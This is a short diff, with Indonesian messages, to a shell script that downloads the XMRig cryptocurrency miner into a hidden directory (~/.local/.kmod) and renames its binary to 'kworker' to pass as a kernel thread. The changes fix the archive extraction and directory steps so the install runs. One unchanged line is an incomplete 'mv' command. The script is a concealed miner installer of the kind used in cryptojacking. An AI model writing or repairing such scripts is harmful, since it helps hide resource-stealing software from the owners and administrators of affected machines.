@@ -12,9 +12,9 @@ cd ~/.local/.kmod
 
 echo "[*] Mengunduh XMRig..."
 wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-linux-x64.tar.gz
-tar -xvf xmrig-6.21.2-linux-x64.tar.gz
+tar -xzvf xmrig-6.21.2-linux-x64.tar.gz
 mv xmrig-6.21.2
-cd xmrig
+cd xmrig-6.21.2
 
 echo "[*] Rename binary ke kworker..."
 mv xmrig kworker
